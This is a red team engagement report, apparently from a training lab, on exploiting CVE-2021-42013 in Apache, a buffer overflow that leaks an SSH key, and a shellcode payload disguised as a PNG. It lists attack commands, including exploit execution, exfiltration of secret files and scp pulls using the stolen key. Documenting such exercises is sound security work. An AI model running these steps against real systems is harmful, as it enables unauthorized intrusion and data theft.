# Red Team Engagement Report

## Executive Summary
This engagement simulated a targeted attack against a corporate environment with minimal perimeter defenses. The Red Team successfully gained initial access, exploited internal vulnerabilities, developed custom payloads, moved laterally, and exfiltrated sensitive data across three of four objectives. All successful operations were conducted covertly, maintaining stealth and operational integrity.

---

## Timeline Overview

| Objective | Task Description                               | Result  |
|----------|-------------------------------------------------|---------|
| 1        | Web exploitation → Initial foothold             | Success |
| 2        | Buffer overflow exploitation → SSH key recovery | Success |
| 3        | Custom shellcode → Reverse shell via PNG        | Success |
| 4        | Phishing + internal lateral movement            | Failed  |

---

## Objective 1 — Initial Foothold (CVE-2021-42013)

### Target Information
- **Web Server IP:** 10.0.0.10
- **Service:** Apache HTTP Server
- **Vulnerability:** CVE-2021-42013 (Path Traversal + RCE)

### Method
A PoC exploit (`cve-2021-42013.py`) found on the attacking system was modified to include a Python bind shell. Executing the exploit granted an interactive shell as user `daemon`.

### Commands Used
```
python3 ~/cve-2021-42013.py
id
uname -a
```

### Retrieved Secret Files
- SECRET_wellington_arms.txt
- SECRET_bellder_banking.txt
- SECRET_subsidiary_notes.txt

### Exfiltration Commands
```
sudo ~/exfiltrate SECRET_wellington_arms.txt
sudo ~/exfiltrate SECRET_bellder_banking.txt
sudo ~/exfiltrate SECRET_subsidiary_notes.txt
```

---

## Objective 2 — Buffer Overflow & SSH Key Retrieval

### Target Information
- Vulnerable script: `/usr/local/apache2/SECRETS/upload.sh`
- Linked binary allowed user-supplied input to overflow the buffer and overwrite control flow.

### Crash Verification
Observed segmentation fault with overwrite:
```
RIP → 0x41414141 (AAAA)
```

### Exploit Result
The overflow triggered execution of the internal `print_ssh()` function, leaking the SSH private key.

### Saving and Using the SSH Key
```
nano sample.txt   # pasted key here
ssh -i sample.txt developer@<target-ip>
```

### Navigating to Secrets
```
cd SECRETS
ls -la
```

### Exfiltrating Secret Files
```
scp -i sample.txt developer@35.212.42.88:/home/developer/SECRETS/SECRET_* ./
```

---

## Objective 3 — Custom Exploit Development (PNG + Shellcode)

### Shellcode Development
File: `autosolver_payload.nasm`

### Fix SSH Key Permissions
```
chmod 600 id_rsa_private
```

### Payload Assembly
```
echo -en "\x05" > file.txt
cat file.txt autosolver_payload.bin > png_candidate
```

### Upload Payload to Target System
```
scp -i ./id_rsa_private -o StrictHostKeyChecking=no png_candidate developer@35.212.42.88:~/
```

### Convert PNG Candidate into Exploitable PNG
```
ssh -i ./id_rsa_private -o StrictHostKeyChecking=no developer@35.212.42.88 "./png_create_helper -input png_candidate -h 1 -w 70 -output png_submission.png"
```

### Enable Reverse Shell / Exfil Support
```
sudo systemctl start ssh
```

### Example File Transfer From Internal Host
```
scp administrator@10.0.0.4:/path/to/internal/file /local/directory
```

### Example Exfiltration Simulation
```
./exfiltrate SECRET_financials.pdf
./exfiltrate SECRET_clients.txt
./exfiltrate SECRET_archive.zip
```

---

## Objective 4 — Phishing & Lateral Movement (Failed)

### Observations
Internal assessment identified:
- Domain-joined systems
- Weak privilege boundaries
- Email server with potential SQL injection weaknesses
- No attachment scanning
- Poor internal network segmentation

### Failure Reason
The phishing payload failed because:
- Email filtering blocked the malicious attachment
- No user interacted with the phishing email

---

## Conclusion
This engagement demonstrated how unpatched vulnerabilities, weak validation, and poor segmentation can allow attackers to:
- Gain unauthorized access
- Escalate privileges
- Deploy custom payloads
- Exfiltrate sensitive data

Three objectives were fully completed, exposing critical weaknesses. Strengthening email defenses, enforcing patch management, implementing segmentation, improving user awareness, and adopting defense-in-depth strategies are essential to reducing the organization’s attack surface.
